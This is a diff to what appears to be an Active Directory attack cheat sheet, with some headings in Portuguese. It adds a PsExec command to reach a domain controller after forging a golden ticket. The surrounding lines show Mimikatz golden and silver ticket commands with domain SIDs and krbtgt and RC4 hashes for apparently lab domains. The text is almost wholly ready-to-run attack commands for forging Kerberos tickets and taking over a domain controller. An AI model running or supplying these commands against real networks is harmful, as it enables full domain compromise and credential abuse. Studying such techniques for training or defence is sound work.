@@ -3073,6 +3073,10 @@ kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-312420
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ``` 
+GOLDEN TICKET - ACESSAR DOMAIN CONTROLLER:
+``` 
+.\PsExec.exe -accepteula \\dcorp-dc cmd
+``` 
 ##### MIMIKATZ - SILVER TICKET (SCHEDULED TASKS)
 ```
 kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:DCORP-DC /service:host /rc4:c8c8cb22026d2c89afe3b2280707e055 /user:administrator /ptt
